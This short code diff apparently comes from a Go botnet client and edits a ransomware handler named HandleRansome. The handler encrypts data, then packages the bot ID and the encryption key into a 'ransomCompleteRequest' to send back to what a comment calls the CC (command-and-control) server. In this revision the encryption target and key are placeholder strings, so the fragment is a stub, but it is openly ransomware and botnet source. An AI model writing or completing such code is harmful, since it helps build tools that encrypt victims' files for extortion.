@@ -39,12 +39,14 @@ func (b *BotService) HandleScan(payload []byte) {
 
 //HandleRansome is
 func (b *BotService) HandleRansome(payload []byte) {
-	if err := b.CryptoService.Encrypt(""); err != nil {
-		log.Panic(err)
+	if _, err := b.CryptoService.Encrypt([]byte("file to encrypt")); err != nil {
+		// return to CC encrypt failed
+		log.Println(err)
+		return
 	}
 	msg := &ransomCompleteRequest{
 		BotID: b.Bot.ID,
-		Key:   b.Ransomer.Key(),
+		Key:   []byte("key we will generate"),
 	}
 	by, err := botnet.Bytes(msg)
 	if err != nil {
